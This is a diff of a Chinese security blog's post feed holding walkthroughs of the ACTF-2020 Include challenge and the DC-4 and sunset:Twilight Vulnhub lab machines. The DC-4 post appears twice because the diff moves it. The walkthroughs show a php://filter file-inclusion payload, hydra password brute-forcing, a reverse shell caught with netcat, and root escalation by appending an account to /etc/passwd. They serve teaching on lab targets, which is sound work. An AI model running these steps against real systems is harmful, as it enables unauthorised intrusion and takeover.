-<h1 id="ACTF-2020-Include"><a href="#ACTF-2020-Include" class="headerlink" title="ACTF-2020-Include"></a>ACTF-2020-Include</h1><h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结合题目名可以猜测是一个文件包含</p>
-<p>使用<code>php伪协议</code>读一下源码</p>
-<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
-<p>解码之后是</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
-
-<p>得到了flag</p>
 ]]></content>
       <categories>
         <category>web</category>
@@ -2056,54 +2086,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub DC-4靶机</title>
-    <url>//DC-4.html</url>
-    <content><![CDATA[<p>vulnhub里的 DC-4 靶机</p>
-<p>初学者难度</p>
-<a id="more"></a>
-
-<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">vulnhub DC-4</a></p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP地址"><a href="#NMAP扫描得到IP地址" class="headerlink" title="NMAP扫描得到IP地址"></a>NMAP扫描得到IP地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.133</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
-<p>主机发现,ip地址为<code>192.168.147.133</code>,进行详细的扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.147.133 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
-<p>真的只开启了 <strong>22和80</strong> 两个端口</p>
-<h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324062452.png" alt="file"><br>一副可以爆破的样子,直接上 <code>rockyou</code> 字典</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt  192.168.147.133 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.147.133   login: admin   password: happy</span><br></pre></td></tr></table></figure>
-<p>得到了密码,登陆进去,可以运行三种指令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324336037.png" alt="file"></p>
-<p>可以抓包修改指令内容,也可以在前端修改html元素写上反弹shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586325632432.png" alt="file"><br>在本地监听之后<code>Run</code>就可以接收到shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.133] 34932</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
-<p>查看用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>
-<h3 id="登录到jim"><a href="#登录到jim" class="headerlink" title="登录到jim"></a>登录到jim</h3><p>挨个进去看看有啥(只有jim有东西)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls -al back*</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..</span><br><span class="line">-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak</span><br></pre></td></tr></table></figure>
-
-<p>看名字就知道应该是备份的旧密码,本地保存之后拿去用<code>hydra</code>爆破一下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P password.txt ssh://192.168.147.133:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.147.133   login: jim   password: jibril04</span><br></pre></td></tr></table></figure>
-<p>得到密码之后连接上去</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.147.133</span><br><span class="line">jim@192.168.147.133&#39;s password:</span><br><span class="line"></span><br><span class="line">You have mail.</span><br><span class="line">jim@dc-4:~$ whoami</span><br><span class="line">jim</span><br></pre></td></tr></table></figure>
-<h3 id="切换到charles"><a href="#切换到charles" class="headerlink" title="切换到charles"></a>切换到charles</h3><p>他说有一个邮件,用<code>mail</code>命令查看一下邮件的路径</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jim@dc-4:/var$ mail</span><br><span class="line">Mail version 8.1.2 01/15/2001.  Type ? for help.</span><br><span class="line">&quot;/var/mail/jim&quot;: 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays</span></span><br><span class="line">&amp; Held 1 message in /var/mail/jim</span><br><span class="line"></span><br><span class="line">cat /var/mail/jim</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
-<p>直接给密码,这也太棒了</p>
-<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>切换到<code>charles</code>用户,查找一下能够提权的东西</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">charles@dc-4:/var$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
-<p>这是啥指令,不知道,看一下help</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">teehee --help</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br></pre></td></tr></table></figure>
-<p>看到这条,可以写文件,并且是可以<code>sudo</code>的,就用它提权了(其实我不知道这里怎么提权,百度了资料)</p>
-<p>有两种办法,第一种是在<code>/etc/passwd</code>里面追加一个用户,和<code>root</code>的权限一样,第二种是修改定时任务<br>我用的是第一种</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">charles@dc-4:/var$ echo &quot;shiroha::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ cat /etc/passwd | grep &quot;shiroha&quot;</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ su shiroha</span><br><span class="line">root@dc-4:/var# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-4:/var# cat /root/</span><br><span class="line">.bash_history  .bashrc        flag.txt       .nano/         .profile       </span><br><span class="line">root@dc-4:/var# cat /root/flag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>DC</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>enum</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub DC-6靶机</title>
     <url>//DC-6.html</url>
     <content><![CDATA[<p>vulnhub里的 DC-6 靶机</p>
@@ -2152,6 +2134,54 @@
       <tags>
         <tag>exploit</tag>
         <tag>wordpress</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub DC-4靶机</title>
+    <url>//DC-4.html</url>
+    <content><![CDATA[<p>vulnhub里的 DC-4 靶机</p>
+<p>初学者难度</p>
+<a id="more"></a>
+
+<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">vulnhub DC-4</a></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP地址"><a href="#NMAP扫描得到IP地址" class="headerlink" title="NMAP扫描得到IP地址"></a>NMAP扫描得到IP地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.133</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
+<p>主机发现,ip地址为<code>192.168.147.133</code>,进行详细的扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.147.133 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
+<p>真的只开启了 <strong>22和80</strong> 两个端口</p>
+<h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324062452.png" alt="file"><br>一副可以爆破的样子,直接上 <code>rockyou</code> 字典</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt  192.168.147.133 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.147.133   login: admin   password: happy</span><br></pre></td></tr></table></figure>
+<p>得到了密码,登陆进去,可以运行三种指令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324336037.png" alt="file"></p>
+<p>可以抓包修改指令内容,也可以在前端修改html元素写上反弹shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586325632432.png" alt="file"><br>在本地监听之后<code>Run</code>就可以接收到shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.133] 34932</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>查看用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>
+<h3 id="登录到jim"><a href="#登录到jim" class="headerlink" title="登录到jim"></a>登录到jim</h3><p>挨个进去看看有啥(只有jim有东西)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls -al back*</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..</span><br><span class="line">-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak</span><br></pre></td></tr></table></figure>
+
+<p>看名字就知道应该是备份的旧密码,本地保存之后拿去用<code>hydra</code>爆破一下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P password.txt ssh://192.168.147.133:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.147.133   login: jim   password: jibril04</span><br></pre></td></tr></table></figure>
+<p>得到密码之后连接上去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.147.133</span><br><span class="line">jim@192.168.147.133&#39;s password:</span><br><span class="line"></span><br><span class="line">You have mail.</span><br><span class="line">jim@dc-4:~$ whoami</span><br><span class="line">jim</span><br></pre></td></tr></table></figure>
+<h3 id="切换到charles"><a href="#切换到charles" class="headerlink" title="切换到charles"></a>切换到charles</h3><p>他说有一个邮件,用<code>mail</code>命令查看一下邮件的路径</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jim@dc-4:/var$ mail</span><br><span class="line">Mail version 8.1.2 01/15/2001.  Type ? for help.</span><br><span class="line">&quot;/var/mail/jim&quot;: 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays</span></span><br><span class="line">&amp; Held 1 message in /var/mail/jim</span><br><span class="line"></span><br><span class="line">cat /var/mail/jim</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+<p>直接给密码,这也太棒了</p>
+<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>切换到<code>charles</code>用户,查找一下能够提权的东西</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">charles@dc-4:/var$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
+<p>这是啥指令,不知道,看一下help</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">teehee --help</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br></pre></td></tr></table></figure>
+<p>看到这条,可以写文件,并且是可以<code>sudo</code>的,就用它提权了(其实我不知道这里怎么提权,百度了资料)</p>
+<p>有两种办法,第一种是在<code>/etc/passwd</code>里面追加一个用户,和<code>root</code>的权限一样,第二种是修改定时任务<br>我用的是第一种</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">charles@dc-4:/var$ echo &quot;shiroha::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ cat /etc/passwd | grep &quot;shiroha&quot;</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ su shiroha</span><br><span class="line">root@dc-4:/var# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-4:/var# cat /root/</span><br><span class="line">.bash_history  .bashrc        flag.txt       .nano/         .profile       </span><br><span class="line">root@dc-4:/var# cat /root/flag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>DC</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>enum</tag>
       </tags>
   </entry>
   <entry>
@@ -3015,6 +3045,56 @@
       </tags>
   </entry>
   <entry>
+    <title>vulnhub sunset:twilight靶机</title>
+    <url>//sunset-twilight.html</url>
+    <content><![CDATA[<p>Vulnhub sunset系列</p>
+<a id="more"></a>
+
+<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
+<li>靶机ip: <code>192.168.6.129</code></li>
+<li>kali ip: <code>192.168.6.128</code></li>
+</ul>
+<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
+
+<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
+<p>点击<code>pictures</code></p>
+<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
+<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
+<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
+<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
+<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
+<p>找到了这个目录，访问之后是文件上传</p>
+<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
+<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
+<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
+<p>访问之后得到shell</p>
+<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>
+
+<p>看到php文件，以为是用php提权，结果发现并不是</p>
+<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
+<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
+<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
+<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
+<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
+<p>然后切换用户，得到<code>root</code>权限</p>
+<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
+<p>这次的图不是很好看（</p>
+<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
+]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>sunset</category>
+      </categories>
+      <tags>
